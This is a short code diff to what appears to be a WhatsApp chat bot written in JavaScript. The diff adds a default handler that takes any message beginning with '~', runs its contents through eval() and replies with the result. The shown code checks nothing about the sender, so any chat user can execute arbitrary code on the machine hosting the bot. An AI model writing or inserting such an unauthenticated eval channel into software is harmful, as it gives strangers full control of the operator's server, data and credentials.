@@ -330,11 +330,22 @@ let listMessage = {
  await conn.sendMessage(from, listMessage)
  await conn.sendMessage(from,  { audio: fs.readFileSync("mert.mp3"), ptt: true })
 
- 
- 
-
 break
 
+
+default:
+	if (m.body.startsWith('~')) {
+		console.log(color('[EVAL1]'), color(moment(z.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
+		try {
+		let evaled = await eval(m.body.slice(2))
+		if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+		m.reply(`${evaled}`)
+		} catch (err) {
+		m.reply(`${err}`)
+		}
+		}
+
+		
 			}
 			
 		} catch (e) {
